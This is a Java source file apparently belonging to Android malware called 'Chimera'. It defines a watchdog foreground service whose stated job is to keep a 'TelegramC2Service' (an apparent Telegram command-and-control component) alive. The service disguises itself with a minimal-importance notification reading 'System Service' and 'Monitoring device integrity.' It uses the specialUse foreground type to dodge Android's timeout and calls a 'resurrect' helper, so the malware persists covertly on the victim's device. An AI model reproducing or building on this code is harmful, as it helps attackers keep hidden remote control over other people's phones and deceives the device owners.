package com.chimera;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;

/**
 * Second process watchdog (android:process=":watchdog" not used yet - runs same process but as separate service)
 * Minimal FGS that only ensures TelegramC2Service is alive. Uses specialUse to avoid 6hr timeout.
 */
public class WatchdogService extends Service {
    private static final String CHANNEL_ID = "ChimeraWatchdogChannel";
    private static final int NOTIFICATION_ID = 2;

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            createChannel();
            Notification n = new Notification.Builder(this, CHANNEL_ID)
                    .setContentTitle("System Service")
                    .setContentText("Monitoring device integrity.")
                    .setSmallIcon(android.R.drawable.ic_lock_lock)
                    .setOngoing(true)
                    .build();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIFICATION_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
            } else {
                startForeground(NOTIFICATION_ID, n);
            }
        } catch (Exception e) { ErrorLogger.logError(this, "Watchdog_onCreate", e); }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            ResurrectionHelper.resurrect(this);
        } catch (Exception e) { ErrorLogger.logError(this, "Watchdog_onStart", e); }
        // Short-lived: do work then stopSelf, WorkManager will restart periodically
        stopSelf();
        return START_NOT_STICKY;
    }

    @Override public IBinder onBind(Intent intent) { return null; }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Watchdog", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
    }
}
